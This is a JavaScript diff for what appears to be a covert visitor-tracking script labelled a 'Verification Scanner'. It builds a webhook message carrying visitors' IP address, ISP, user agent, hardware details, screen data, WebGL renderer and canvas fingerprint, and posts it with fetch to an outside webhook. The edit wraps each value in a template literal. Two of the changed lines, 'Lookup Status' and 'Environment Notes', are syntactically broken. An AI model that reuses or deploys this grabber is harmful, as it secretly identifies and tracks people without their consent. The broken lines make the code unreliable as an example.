@@ -160,44 +160,44 @@ await fetch(WEBHOOK_URL, {
       color: 3447003,
       fields: [
         // —— TIMEZONE ——
-        { name: "Timestamp", value: basic.timestamp || "Unknown", inline: false },
-        { name: "Local Time", value: basic.localTime || "Unknown", inline: false },
-        { name: "Timezone", value: basic.timezone || "Unknown", inline: true },
-        { name: "UTC Offset (Minutes)", value: basic.offsetMinutes || "Unknown", inline: true },
+        { name: "Timestamp", value: `${basic.timestamp || "Unknown"}`, inline: false },
+        { name: "Local Time", value: `${basic.localTime || "Unknown"}`, inline: false },
+        { name: "Timezone", value: `${basic.timezone || "Unknown"}`, inline: true },
+        { name: "UTC Offset (Minutes)", value: `${basic.offsetMinutes || "Unknown"}`, inline: true },
       
         // —— SYSTEM ——
-        { name: "Platform", value: basic.platform || "Unknown", inline: true },
-        { name: "CPU Threads", value: basic.hardwareConcurrency || "Unknown", inline: true },
-        { name: "Device Memory", value: basic.deviceMemory || "Unknown", inline: false },
-        { name: "Cookies Enabled", value: basic.cookieEnabled || "Unknown", inline: false },
-        { name: "Do Not Track", value: basic.doNotTrack || "Unknown", inline: true },
-        { name: "User Agent", value: basic.userAgent || "Unknown", inline: false },
+        { name: "Platform", value: `${basic.platform || "Unknown"}`, inline: true },
+        { name: "CPU Threads", value: `${basic.hardwareConcurrency || "Unknown"}`, inline: true },
+        { name: "Device Memory", value: `${basic.deviceMemory || "Unknown"}`, inline: false },
+        { name: "Cookies Enabled", value: `${basic.cookieEnabled || "Unknown"}`, inline: false },
+        { name: "Do Not Track", value: `${basic.doNotTrack || "Unknown"}`, inline: true },
+        { name: "User Agent", value: `${basic.userAgent || "Unknown"}`, inline: false },
 
         // —— DISPLAY ——
         { name: "Screen Size", value: `${screenInfo.width}x${screenInfo.height}`, inline: true },
         { name: "Available Size", value: `${screenInfo.availWidth}x${screenInfo.availHeight}`, inline: true },
         { name: "Window Size", value: `${screenInfo.windowWidth}x${screenInfo.windowHeight}`, inline: true },
-        { name: "Pixel Ratio", value: screenInfo.pixelRatio || "Unknown", inline: false },
+        { name: "Pixel Ratio", value: `${screenInfo.pixelRatio || "Unknown"}`, inline: false },
 
         // —— INPUT ——
-        { name: "Touch Points", value: touch.maxTouchPoints || "Unknown", inline: false },
-        { name: "Touch Events", value: touch.touchEvent || "Unknown", inline: true },
+        { name: "Touch Points", value: `${touch.maxTouchPoints || "Unknown"}`, inline: false },
+        { name: "Touch Events", value: `${touch.touchEvent || "Unknown"}`, inline: true },
 
         // —— GRAPHICS ——
-        { name: "WebGL Supported", value: webgl.supported || "Unknown", inline: true },
-        { name: "WebGL Vendor", value: webgl.vendor || "Unknown", inline: false },
-        { name: "WebGL Renderer", value: webgl.renderer || "Unknown", inline: false },
+        { name: "WebGL Supported", value: `${webgl.supported || "Unknown"}`, inline: true },
+        { name: "WebGL Vendor", value: `${webgl.vendor || "Unknown"}`, inline: false },
+        { name: "WebGL Renderer", value: `${webgl.renderer || "Unknown"}`, inline: false },
 
         // —— NETWORK ——
-        { name: "IP Address", value: network.ip || "Unknown", inline: false },
-        { name: "ISP / Org", value: network.org || "Unknown", inline: false },
-        { name: "Lookup Status", value: network.lookupStatus || "Unknown", inline: false },
+        { name: "IP Address", value: `${network.ip || "Unknown"}`, inline: false },
+        { name: "ISP / Org", value: `${network.org || "Unknown"}`, inline: false },
+        { name: "Lookup Status", value: `${network.lookupStatus || "Unknown", inline: false },
 
         // —— CANVAS ——
-        { name: "Canvas Hash", value: canvasFP || "Unknown", inline: false },
+        { name: "Canvas Hash", value: `${canvasFP || "Unknown"}`, inline: false },
 
         // —— NOTES ——
-        { name: "Environment Notes", value: "None", inline: false }
+        { name: "Environment Notes", `${value: "None", inline: false }
       ],
       footer: {
         text: "Verification Scanner · Summary Report"
